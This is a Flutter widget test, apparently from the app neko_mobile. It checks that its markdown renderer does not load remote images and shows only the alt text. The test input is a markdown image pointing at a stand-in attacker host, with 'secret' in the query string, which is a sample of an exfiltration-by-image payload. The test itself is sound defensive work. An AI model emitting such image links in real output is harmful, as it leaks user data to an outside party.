import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:neko_mobile/ui/widgets/markdown_view.dart';

void main() {
  testWidgets('远程图片不加载，仅显示占位文字', (tester) async {
    await tester.pumpWidget(
      const MaterialApp(
        home: Scaffold(
          body: NekoMarkdown('![追踪](http://attacker.invalid/p.png?d=secret)'),
        ),
      ),
    );
    await tester.pump();
    expect(find.byType(Image), findsNothing);
    expect(find.textContaining('追踪', findRichText: true), findsOneWidget);
  });
}
